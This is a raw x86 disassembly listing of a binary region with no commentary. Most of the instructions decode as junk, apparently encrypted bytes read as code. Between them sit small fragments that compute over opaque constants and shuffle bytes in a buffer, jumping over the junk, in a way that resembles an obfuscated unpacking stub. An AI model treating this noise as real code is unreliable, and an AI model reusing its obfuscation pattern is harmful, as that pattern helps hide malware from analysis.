  408494:	xchg   ebp,eax
  408495:	ror    edx,1
  408497:	enter  0xb79b,0xc
  40849b:	(bad)  
  40849d:	ins    BYTE PTR es:[edi],dx
  40849e:	xchg   ebp,eax
  40849f:	mov    BYTE PTR [ecx],bl
  4084a1:	mov    ah,0xff
  4084a3:	xor    ebp,esp
  4084a5:	mov    edx,0x73c4f579
  4084aa:	fidivr WORD PTR ds:0x6bc5fcb7
  4084b0:	icebp  
  4084b1:	in     al,0x36
  4084b3:	shl    BYTE PTR [edi],0x89
  4084b6:	ds xchg ebx,eax
  4084b8:	inc    ebp
  4084b9:	add    ecx,ecx
  4084bb:	xor    BYTE PTR [edx+0x70],ch
  4084be:	and    eax,0xc0d4dffb
  4084c3:	push   es
  4084c4:	xlat   BYTE PTR ds:[ebx]
  4084c5:	scas   al,BYTE PTR es:[edi]
  4084c6:	inc    edx
  4084c7:	xchg   ah,al
  4084c9:	arpl   WORD PTR [edi-0x2ff691d8],ax
  4084cf:	mov    bl,BYTE PTR [edi+0x6b730733]
  4084d5:	and    eax,0x7da31819
  4084da:	dec    esp
  4084db:	xchg   esi,edx
  4084dd:	shl    DWORD PTR [ebp+eax*8-0x5f1f653d],1
  4084e4:	and    DWORD PTR [edx],eax
  4084e6:	add    ebx,0xffffffbf
  4084e9:	in     al,dx
  4084ea:	pop    es
  4084eb:	cli    
  4084ec:	sub    BYTE PTR [ecx],cl
  4084ee:	jno    0x4084be
  4084f0:	jo     0x4084e6
  4084f2:	ins    DWORD PTR es:[edi],dx
  4084f3:	das    
  4084f4:	inc    edi
  4084f5:	add    BYTE PTR [ecx+0x71a2dc87],cl
  4084fb:	xchg   ebx,eax
  4084fc:	mov    dh,0xe4
  4084fe:	scas   eax,DWORD PTR es:[edi]
  4084ff:	dec    DWORD PTR [ecx+0x4a8650b4]
  408505:	jne    0x408524
  408507:	test   BYTE PTR ds:0xb3eee8c1,bh
  40850d:	ret    
  40850e:	enter  0xc78a,0x44
  408512:	or     al,0x1e
  408514:	cmp    dh,ah
  408516:	ret    
  408517:	sbb    ebx,DWORD PTR [ebx]
  408519:	(bad)  
  40851a:	sub    BYTE PTR [esp+eax*4+0x1c639c21],cl
  408521:	lods   eax,DWORD PTR ds:[esi]
  408522:	jae    0x4084d8
  408524:	mov    bh,0xf7
  408526:	pop    eax
  408527:	push   edi
  408528:	sbb    al,0x6a
  40852a:	in     al,0x1a
  40852c:	(bad)  
  40852d:	pop    esp
  40852e:	(bad)  
  40852f:	push   ds
  408530:	or     al,0xd8
  408532:	cmp    dh,BYTE PTR [eax+edx*2+0x4]
  408536:	out    dx,eax
  408537:	sbb    bl,BYTE PTR [edi+0x7]
  40853a:	mov    al,0xd6
  40853c:	xchg   BYTE PTR [edi],cl
  40853e:	rcr    esp,0xef
  408541:	xchg   BYTE PTR [edx],dh
  408543:	add    eax,ecx
  408545:	mov    bh,0xe7
  408547:	daa    
  408548:	retf   
  408549:	xchg   dl,dh
  40854b:	(bad)  
  40854c:	test   BYTE PTR [ebx-0xf7066b6],ah
  408552:	fsubr  QWORD PTR [edx]
  408554:	mov    edx,0x8ea273a3
  408559:	cli    
  40855a:	jge    0x4084e3
  40855c:	xchg   ebx,eax
  40855d:	lea    esp,[ebp-0x3c93a987]
  408563:	stc    
  408564:	add    ebp,DWORD PTR [ebp-0xfb006a1]
  40856a:	in     eax,dx
  40856b:	fcomip st,st(2)
  40856d:	cmp    eax,0x3b01d91d
  408572:	in     al,0xb5
  408574:	add    DWORD PTR [ecx],0x17
  408577:	stos   DWORD PTR es:[edi],eax
  408578:	sbb    DWORD PTR [ebx-0x2f],0x235526e5
  40857f:	pop    edx
  408580:	(bad)  
  408581:	xlat   BYTE PTR ds:[ebx]
  408582:	add    dh,dh
  408584:	aas    
  408585:	xchg   ebp,edi
  408587:	and    BYTE PTR [ebx],bh
  408589:	fimul  DWORD PTR [edi]
  40858b:	xchg   DWORD PTR [eax],ecx
  40858d:	add    BYTE PTR [eax],al
  40858f:	add    BYTE PTR [ebx-0x271633ab],cl
  408595:	add    DWORD PTR [eax],eax
  408597:	add    BYTE PTR [ebx+0x7d8bc455],cl
  40859d:	cld    
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0xf122353f
  4085c4:	fimul  DWORD PTR [ecx-0x1f]
  4085c7:	xlat   BYTE PTR ds:[ebx]
  4085c8:	jle    0x408648
  4085ca:	mov    bh,BYTE PTR [edi+0x7e]
  4085cd:	jle    0x408643
  4085cf:	test   al,0xca
  4085d1:	pop    eax
  4085d2:	sbb    ah,BYTE PTR [edi+0x7535c806]
  4085d8:	sub    ebx,esi
  4085da:	ins    BYTE PTR es:[edi],dx
  4085db:	cli    
  4085dc:	div    edx
  4085de:	repz push es
  4085e0:	pop    edx
  4085e1:	cmc    
  4085e2:	rcr    DWORD PTR [eax],cl
  4085e4:	push   edi
  4085e5:	jae    0x4085a6
  4085e7:	das    
  4085e8:	jns    0x4085bd
  4085ea:	add    eax,0x81671660
  4085ef:	mov    esp,0x9477d0ce
  4085f4:	lock xchg BYTE PTR [ecx+0x1c7bf650],cl
  4085fb:	ror    DWORD PTR [eax-0x41],cl
  4085fe:	scas   al,BYTE PTR es:[edi]
  4085ff:	aad    0xbf
  408601:	fucomp st(1)
  408603:	xor    eax,0xd15f3b3f
  408608:	sbb    ebx,DWORD PTR [esi-0x70ea1666]
  40860e:	xor    esp,DWORD PTR [ecx+eax*1-0x48]
  408612:	pusha  
  408613:	xchg   ecx,esi
  408615:	and    al,0xe3
  408617:	cs ja  0x40868c
  40861a:	push   ecx
  40861b:	test   al,0x98
  40861d:	fisubr WORD PTR ds:0x84fbfc50
  408623:	ss mov esp,0xcf359e11
  408629:	cmp    BYTE PTR [ebp+0x25],0xee
  40862d:	aad    0x38
  40862f:	or     eax,0x5c733238
  408634:	in     eax,0x21
  408636:	cs mov ebp,DWORD PTR ss:[ecx+esi*1]
  40863b:	call   FWORD PTR [edx-0x45]
  40863e:	pop    ecx
  40863f:	and    al,0xa1
  408641:	in     al,0x68
  408643:	mov    esp,0xbfba4a31
  408648:	ror    DWORD PTR [edi],0xff
  40864b:	sub    eax,0x8176aeb3
  408650:	test   cl,ch
  408652:	pop    ecx
  408653:	mov    dh,0x3c
  408655:	push   edi
  408656:	mov    dh,BYTE PTR [esi-0x37]
  408659:	and    bl,BYTE PTR [ecx-0x45]
  40865c:	mov    esp,0xcadc9749
  408661:	aas    
  408662:	dec    edx
  408663:	stc    
  408664:	pop    ss
  408665:	fbstp  TBYTE PTR [esi+0x3dd83eba]
  40866b:	out    0x2,eax
  40866d:	xor    DWORD PTR [edi+0x29],edx
  408670:	aaa    
  408671:	dec    edi
  408672:	jmp    FWORD PTR [eax+ebx*1]
  408675:	inc    ebp
  408676:	mov    bl,0xf
  408678:	dec    edi
  408679:	sahf   
  40867a:	jae    0x408696
  40867c:	jp     0x40869a
  40867e:	add    ebx,DWORD PTR [edi]
  408680:	jmp    0x20cd:0xdc3012f4
  408687:	test   BYTE PTR [ebx+eax*4+0x51],bh
  40868b:	xchg   esi,eax
  40868c:	sub    eax,0x6ff4691b
  408691:	cmp    al,BYTE PTR [ecx+esi*4]
  408694:	(bad)
  408697:	and    BYTE PTR [edi-0x6],ah
  40869a:	jl     0x4086c8
  40869c:	out    0xd8,al
  40869e:	enter  0x7481,0x5a
  4086a2:	jne    0x40862e
  4086a4:	dec    esp
  4086a5:	mov    eax,ds:0xc1e20ddb
  4086aa:	in     eax,dx
  4086ab:	das    
  4086ac:	test   DWORD PTR [ebx],0x960ed05e
  4086b2:	imul   ebp,ecx,0x523dcf1
  4086b8:	js     0x408737
  4086ba:	mov    WORD PTR [ecx-0x529672c],?
  4086c0:	in     al,0xbe
  4086c2:	(bad)  [edx+0x5f]
  4086c5:	mov    ds:0x39755aeb,al
  4086ca:	test   esp,esp
  4086cc:	pop    esp
  4086cd:	jnp    0x408650
  4086cf:	add    esi,esi
  4086d1:	loope  0x40871d
  4086d3:	js     0x408707
  4086d5:	(bad)  
  4086d6:	xor    BYTE PTR [ebp-0x25],cl
  4086d9:	pushf  
  4086da:	popf   
  4086db:	lock cmp esi,DWORD PTR [edi-0x51]
  4086df:	add    edx,ecx
  4086e1:	sub    eax,0xe00d5c27
  4086e6:	mov    eax,ds:0x5f61e939
  4086eb:	cmp    eax,0x35277428
  4086f0:	cli    
  4086f1:	xlat   BYTE PTR ds:[ebx]
  4086f2:	into   
  4086f3:	rol    BYTE PTR [eax+0x6c921d76],cl
  4086f9:	inc    ebp
  4086fa:	inc    edi
  4086fb:	cmp    DWORD PTR gs:[edi],ecx
  4086fe:	dec    ecx
  4086ff:	int3   
  408700:	fnstsw WORD PTR [ebp+0x4]
  408703:	mov    eax,0xd27744ff
  408708:	push   ebp
  408709:	add    al,0x91
  40870b:	clc    
  40870c:	push   esp
  40870d:	ins    DWORD PTR es:[edi],dx
  40870e:	mov    bl,0xb0
  408710:	loope  0x40876f
  408712:	push   edi
  408713:	push   es
  408714:	nop
  408715:	sub    DWORD PTR [eax-0x3af59b3a],eax
  40871b:	mov    dh,0x1a
  40871d:	(bad)  
  40871e:	and    eax,0x18391c20
  408723:	jge    0x40873c
  408725:	pop    esi
  408726:	xchg   ebp,eax
  408727:	shl    BYTE PTR [edi-0x45],1
  40872a:	xlat   BYTE PTR ds:[ebx]
  40872b:	sub    ah,BYTE PTR [esi]
  40872d:	cs stos BYTE PTR es:[edi],al
  40872f:	mov    WORD PTR [edi],cs
  408731:	mov    edi,0x385382ea
  408736:	pop    esi
  408737:	jno    0x408784
  408739:	jl     0x40870a
  40873b:	mov    ch,0x4e
  40873d:	mov    al,0x51
  40873f:	inc    eax
  408740:	sbb    DWORD PTR [edi-0x6],0x0
  408744:	jmp    0x408733
  408746:	ins    BYTE PTR es:[edi],dx
  408747:	cs in  eax,0x72
  40874a:	shl    BYTE PTR [eax+0x4b],0xea
  40874e:	lds    ebp,FWORD PTR [esi+eiz*1+0x6f]
  408752:	loopne 0x4087b8
  408754:	(bad)  
  408755:	and    al,0x43
  408757:	fstp   QWORD PTR [ebx-0x40]
  40875a:	popa   
  40875b:	push   ecx
  40875c:	test   BYTE PTR [eax-0x1a],cl
  40875f:	xchg   ebp,eax
  408760:	mov    al,ds:0x8bda3b1f
  408765:	push   ebp
  408766:	enter  0x860f,0x3
  40876a:	add    BYTE PTR [eax],al
  40876c:	add    BYTE PTR [ebx+0x7d8bc455],cl
  408772:	cld    
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	mov    bl,0xf6
  408849:	push   es
  40884a:	sbb    bh,BYTE PTR [ebp-0x2b]
  40884d:	jle    0x4088cd
  40884f:	mov    bh,BYTE PTR [edi+0x7e]
  408852:	jle    0x40885d
  408854:	je     0x4088bc
  408856:	mov    WORD PTR [ebx],ds
  408858:	pop    ds
  408859:	xor    al,0xe4
  40885b:	dec    ebp
  40885c:	push   0x4dc9027
  408861:	and    al,ch
  408863:	fadd   DWORD PTR [edi+0x38484892]
  408869:	into   
  40886a:	sub    BYTE PTR es:[ebx-0x61],al
  40886e:	xor    BYTE PTR [eax-0x3714c67f],al
  408874:	ss jae 0x408894
  408877:	mov    ch,0xeb
  408879:	test   al,0x38
  40887b:	inc    ebx
  40887c:	push   ecx
  40887d:	adc    eax,ebp
  40887f:	xchg   edi,eax
  408880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408881:	or     ebp,esi
  408883:	(bad)  
  408885:	in     al,0xbc
  408887:	lock cdq 
  408889:	bound  edi,QWORD PTR [eax-0x33]
  40888c:	pop    eax
  40888d:	mov    al,ds:0x414685e2
  408892:	or     DWORD PTR [ecx+0x13a21eb8],ebp
  408898:	push   ds
  408899:	in     eax,0x76
  40889b:	jge    0x4088a6
  40889d:	push   0x35a26b3d
  4088a2:	adc    esi,DWORD PTR [ebx+0x6d]
  4088a5:	mov    BYTE PTR [ebp+0x96cbcd0],cl
  4088ab:	lea    edi,[eax-0x565172e3]
  4088b1:	ss dec ecx
  4088b3:	in     eax,0xb3
  4088b5:	mov    edi,0xf3685371
  4088ba:	shr    DWORD PTR [ebx+0x1a],cl
  4088bd:	fidiv  DWORD PTR [ecx]
  4088bf:	loop   0x40891d
  4088c1:	loopne 0x4088d4
  4088c3:	inc    esp
  4088c4:	int3   
  4088c5:	in     eax,dx
  4088c6:	popa   
  4088c7:	cmp    ebx,edx
  4088c9:	or     ah,BYTE PTR [ecx+0x4e453ff2]
  4088cf:	push   edi
  4088d0:	repz pop ds
  4088d2:	ds sbb al,0x27
  4088d5:	mov    ah,0x92
  4088d7:	mov    dl,BYTE PTR [edx]
  4088d9:	(bad)  
  4088da:	pop    ecx
  4088db:	xchg   esi,eax
  4088dc:	rcr    BYTE PTR [edx],cl
  4088de:	jo     0x4088ee
  4088e0:	cmp    BYTE PTR [esi-0x76c388c4],dl
  4088e6:	sbb    eax,0xdbec0e4d
  4088eb:	sti    
  4088ec:	jecxz  0x40890c
  4088ee:	mov    dh,0xb5
  4088f0:	imul   esp,DWORD PTR [eax-0x4c902947],0x9e3a1760
  4088fa:	cmp    esi,DWORD PTR [ebx]
  4088fc:	inc    esp
  4088fd:	in     al,dx
  4088fe:	mov    ds:0x392a9ba2,al
  408903:	sub    DWORD PTR [edi],ecx
  408905:	xchg   ebp,eax
  408906:	or     ecx,DWORD PTR [ebx]
  408908:	mov    ss,WORD PTR [ecx]
  40890a:	popa   
  40890b:	rcr    BYTE PTR [ebp+0x230bf0b],0x7e
  408912:	repnz mov ah,0xc1
  408915:	or     al,0x43
  408917:	dec    ebp
  408918:	stc    
  408919:	enter  0xee5e,0x1c
  40891d:	push   esi
  40891e:	rol    ch,0x60
  408921:	dec    esp
  408922:	test   al,0x7e
  408924:	ret    
  408925:	mov    WORD PTR [esi-0x6ba61139],gs
  40892b:	daa    
  40892c:	js     0x4088f6
  40892e:	push   esp
  40892f:	adc    bh,BYTE PTR [eax+0x38]
  408932:	hlt    
  408933:	cmp    ecx,ebp
  408935:	and    eax,0xd3a98925
  40893a:	or     al,bl
  40893c:	mov    ds:0xf7452218,eax
  408941:	pop    esp
  408942:	fs mov esp,esi
  408945:	cmp    bh,BYTE PTR [esi]
  408947:	inc    edx
  408948:	daa    
  408949:	push   edx
  40894a:	adc    DWORD PTR [edi+0x516b2974],edx
  408950:	imul   esp,DWORD PTR [ebp+0x796a4124],0xe5ee1ed4
  40895a:	std    
  40895b:	jecxz  0x408976
  40895d:	dec    esp
  40895e:	gs popf 
  408960:	lahf   
  408961:	cmp    eax,0xb4c5b46
  408966:	or     eax,0xf206fbef
  40896b:	imul   edx,DWORD PTR [eax-0x22607fea],0xffffffa0
  408972:	adc    ebx,DWORD PTR [esi+0x7bc87606]
  408978:	sar    dh,1
  40897a:	xchg   ebp,eax
  40897b:	je     0x4089ed
  40897d:	sub    DWORD PTR [eax],0x4
  408980:	fmulp  st(1),st
  408982:	in     eax,dx
  408983:	in     al,0x76
  408985:	test   BYTE PTR [ebx-0x17],ah
  408988:	lods   al,BYTE PTR ds:[esi]
  408989:	xchg   esi,eax
  40898a:	das    
  40898b:	jnp    0x4089f2
  40898d:	test   esi,edx
  40898f:	mov    edi,0x6f5c77d5
  408994:	inc    ecx
  408995:	into   
  408996:	cmp    al,0xc2
  408998:	pop    DWORD PTR [edx+0x15]
  40899b:	and    DWORD PTR [edi+0x6],ecx
  40899e:	jne    0x4089e2
  4089a0:	std    
  4089a1:	loop   0x408a0d
  4089a3:	mov    eax,ds:0xa2937c34
  4089a8:	outs   dx,DWORD PTR ds:[esi]
  4089a9:	jp     0x408986
  4089ab:	xor    eax,0x8a6ee815
  4089b0:	inc    edx
  4089b1:	jmp    0x4089bf
  4089b3:	dec    esi
  4089b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089b5:	test   BYTE PTR [esi],al
  4089b7:	shr    dl,cl
  4089b9:	in     eax,0x36
  4089bb:	(bad)  
  4089bc:	pop    ecx
  4089bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089bf:	mov    esp,0xe6df8207
  4089c4:	out    0x33,al
  4089c6:	out    0x44,al
  4089c8:	test   cl,cl
  4089ca:	pop    ecx
  4089cb:	test   cl,bl
  4089cd:	sar    BYTE PTR [ebx],cl
  4089cf:	sahf   
  4089d0:	dec    ebp
  4089d1:	mov    ds:0x4b12e818,eax
  4089d6:	mov    BYTE PTR [ecx+edi*2+0x74],0x69
  4089db:	retf   
  4089dc:	add    dl,dh
  4089de:	lahf   
  4089df:	jmp    0x408975
  4089e1:	rcl    eax,cl
  4089e3:	les    esp,FWORD PTR [esp+edx*2]
  4089e6:	xor    DWORD PTR [ebx],0xfffffff8
  4089e9:	add    edi,ecx
  4089eb:	imul   edi,ebx
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	push   ebx
  408a07:	xchg   ebp,eax
  408a08:	xchg   ebx,eax
  408a09:	ror    BYTE PTR [ecx-0x7581812e],0x7f
  408a10:	jle    0x408a90
  408a12:	leave  
  408a13:	in     eax,dx
  408a14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a15:	mov    esp,DWORD PTR [edx]
  408a17:	adc    DWORD PTR [eax-0x46d04d2c],eax
  408a1d:	jbe    0x408a81
  408a1f:	jnp    0x408a02
  408a21:	not    BYTE PTR gs:[edi+edi*1]
  408a25:	fwait
  408a26:	inc    edi
  408a27:	hlt    
  408a28:	mov    eax,0x953abe51
  408a2d:	or     eax,ecx
  408a2f:	sub    ebx,DWORD PTR [edi+ecx*4]
  408a32:	das    
  408a33:	cmp    ch,BYTE PTR [esi+0x6c02f2c6]
  408a39:	lock sub al,0xf0
  408a3c:	xchg   edi,eax
  408a3d:	test   DWORD PTR ds:0x37c3b19c,edi
  408a43:	cmp    bh,dh
  408a45:	fbld   TBYTE PTR [eax-0x59]
  408a48:	push   ss
  408a49:	int    0x37
  408a4b:	pop    ebx
  408a4c:	push   0xffffffdf
  408a4e:	ret    0x5686
  408a51:	cmp    DWORD PTR [ecx],ebx
  408a53:	xchg   edi,eax
  408a54:	iret   
  408a55:	cmp    BYTE PTR [eax],bl
  408a57:	int    0xf0
  408a59:	(bad)  
  408a5b:	xchg   ebx,eax
  408a5c:	or     ah,BYTE PTR [edi-0x77767c37]
  408a62:	mov    al,ds:0x943ebb0f
  408a67:	adc    edx,esp
  408a69:	test   BYTE PTR ss:[eax-0x2d],0x6d
  408a6e:	mov    ecx,0x35211eec
  408a73:	in     eax,0xa4
  408a75:	sub    BYTE PTR [ecx+0x47c4b75d],0xd
  408a7c:	popf   
  408a7d:	popa   
  408a7e:	push   ecx
  408a7f:	mov    bl,0x2a
  408a81:	call   0xef9ceab0
  408a86:	fcomp  QWORD PTR [esi+0x36b0ec39]
  408a8c:	push   edx
  408a8d:	push   edx
  408a8e:	out    0x5c,al
  408a90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a91:	mov    ?,WORD PTR [eax-0x375f31a6]
  408a97:	cmp    cl,al
  408a99:	int    0x1b
  408a9b:	jl     0x408aa7
  408a9d:	mov    ds:0xeb55d049,eax
  408aa2:	cs mov dh,0x19
  408aa5:	push   eax
  408aa6:	pop    es
  408aa7:	mov    al,0x35
  408aa9:	retf   0x3b82
  408aac:	push   0x37a12044
  408ab1:	rol    DWORD PTR ds:0x52ddf3bf,1
  408ab7:	inc    esp
  408ab8:	fwait
  408ab9:	imul   ebx,DWORD PTR [esi+0x752e58c0],0xffffffca
  408ac0:	mov    ch,0xc0
  408ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ac3:	les    edi,FWORD PTR [esi]
  408ac5:	out    0xc0,al
  408ac7:	push   0x4a3d005a
  408acc:	aaa    
  408acd:	jbe    0x408b49
  408acf:	ror    DWORD PTR [ecx+ecx*2-0x2c7d3346],cl
  408ad6:	imul   BYTE PTR [ebx+0x1]
  408ad9:	xchg   ebp,eax
  408ada:	cmc    
  408adb:	js     0x408b07
  408add:	push   0xffffffa1
  408adf:	(bad)  
  408ae0:	ja     0x408b1a
  408ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ae3:	out    dx,eax
  408ae4:	test   BYTE PTR [edi+0x23],al
  408ae7:	outs   dx,BYTE PTR ds:[esi]
  408ae8:	xchg   edi,eax
  408ae9:	cmc    
  408aea:	cdq    
  408aeb:	pop    ecx
  408aec:	sbb    ch,bl
  408aee:	cmp    ebp,esi
  408af0:	and    ch,BYTE PTR [eax-0x567433c]
  408af6:	xor    esi,DWORD PTR [ebp-0x5b806088]
  408afc:	int    0x3
  408afe:	cs stos DWORD PTR es:[edi],eax
  408b00:	or     esp,DWORD PTR [esi+0x24]
  408b03:	jle    0x408a9d
  408b05:	or     eax,0x9b45268c
  408b0a:	popa   
  408b0b:	or     ebx,ecx
  408b0d:	sbb    al,0xdc
  408b0f:	daa    
  408b10:	mov    al,ds:0x82f46893
  408b15:	pop    edi
  408b16:	test   eax,0xcc5349a6
  408b1b:	add    eax,0xde4bd647
  408b20:	dec    edi
  408b21:	pop    ebp
  408b22:	inc    ebp
  408b23:	clc    
  408b24:	mov    bl,0x99
  408b26:	mov    al,0xd8
  408b28:	es adc ah,ah
  408b2b:	mov    esi,0xe2aca965
  408b30:	push   edx
  408b31:	add    DWORD PTR [ebx-0x7],0x1b
  408b35:	test   BYTE PTR [ebx],bl
  408b37:	mov    eax,0x8c613fa6
  408b3c:	xor    edx,DWORD PTR [esi+0x72756c0]
  408b42:	(bad)  
  408b43:	mov    esi,0x87f5a41a
  408b48:	xchg   BYTE PTR [ecx-0x129a4798],cl
  408b4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b4f:	mov    dl,0xc6
  408b51:	rcl    DWORD PTR [edi-0x5d],0x5b
  408b55:	out    dx,eax
  408b56:	and    DWORD PTR [ecx+0x5f],eax
  408b59:	or     esp,esp
  408b5b:	out    0x3f,al
  408b5d:	sbb    al,0xc2
  408b5f:	lea    esi,ds:0x4a52b4c6
  408b65:	out    dx,al
  408b66:	xchg   cl,ch
  408b68:	retf   
  408b69:	pop    ecx
  408b6a:	lahf   
  408b6b:	pop    ecx
  408b6c:	inc    ebp
  408b6d:	inc    edx
  408b6e:	bound  edi,QWORD PTR ss:[ecx+edi*2+0x5e]
  408b73:	nop
  408b74:	call   DWORD PTR [ebp+0x37]
  408b77:	jg     0x408b08
  408b79:	mov    edx,0x6dc96fd6
  408b7e:	push   ds
  408b7f:	dec    ecx
  408b80:	push   edx
  408b81:	sbb    DWORD PTR [ebp+0x41fbc7c8],ecx
  408b87:	int    0xff
  408b89:	lods   eax,DWORD PTR ds:[esi]
  408b8a:	bound  di,DWORD PTR [esi]
  408b8d:	cld    
  408b8e:	icebp  
  408b8f:	xor    al,0xc3
  408b91:	sub    BYTE PTR [ebx],bl
  408b93:	(bad)  
  408b94:	rcl    DWORD PTR [ecx-0x6181a496],cl
  408b9a:	xlat   BYTE PTR ds:[ebx]
  408b9b:	adc    BYTE PTR [esi+0x390104de],0x1c
  408ba2:	pushf  
  408ba3:	daa    
  408ba4:	in     al,0x68
  408ba6:	lea    edi,[edi+ebx*1+0x32729b]
  408bad:	cmp    edi,edx
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	cld    
  408bd9:	inc    ebp
  408bda:	jbe    0x408c08
  408bdc:	and    eax,0x8a7e7ed0
  408be1:	jg     0x408c61
  408be3:	jle    0x408be9
  408be5:	xor    DWORD PTR ds:0x173ca67c,0xf52a53eb
  408bef:	stos   DWORD PTR es:[edi],eax
  408bf0:	mov    eax,0x7a032f28
  408bf5:	mov    WORD PTR [ebp+ecx*2+0x68a26997],gs
  408bfc:	fimul  DWORD PTR ds:0x32e8d36c
  408c02:	cld    
  408c03:	mov    eax,edx
  408c05:	lahf   
  408c06:	stos   BYTE PTR es:[edi],al
  408c07:	sub    edx,esp
  408c09:	jo     0x408b8b
  408c0b:	dec    esi
  408c0c:	mov    ebp,0x27f5e853
  408c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c12:	lods   al,BYTE PTR ds:[esi]
  408c13:	push   0xffffffa6
  408c15:	scas   eax,DWORD PTR es:[edi]
  408c16:	(bad)  
  408c17:	stc    
  408c18:	fisttp WORD PTR [esi+ebx*4+0x5a1869f]
  408c1f:	aad    0x57
  408c21:	add    bl,bl
  408c23:	sbb    eax,0xaa697b0
  408c28:	sbb    ecx,DWORD PTR [eax-0x46186777]
  408c2e:	sar    DWORD PTR [edi-0x4d],0xb5
  408c32:	xlat   BYTE PTR ds:[ebx]
  408c33:	js     0x408c93
  408c35:	push   ebp
  408c36:	repz push edi
  408c38:	jnp    0x408c4e
  408c3a:	test   BYTE PTR [edi+0x36ad6a6b],0x92
  408c41:	jl     0x408cb8
  408c43:	in     eax,0xbc
  408c45:	adc    bh,bl
  408c47:	pusha  
  408c48:	out    dx,eax
  408c49:	ret    0x5b84
  408c4c:	mov    al,ds:0x26815211
  408c51:	jmp    0xbbf29363
  408c56:	mov    ds:0xa479c1e6,eax
  408c5b:	loope  0x408c19
  408c5d:	(bad)  
  408c5e:	(bad)
  408c61:	or     DWORD PTR [ecx-0x323961e4],esp
  408c67:	cwde   
  408c68:	cli    
  408c69:	daa    
  408c6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c6b:	push   esi
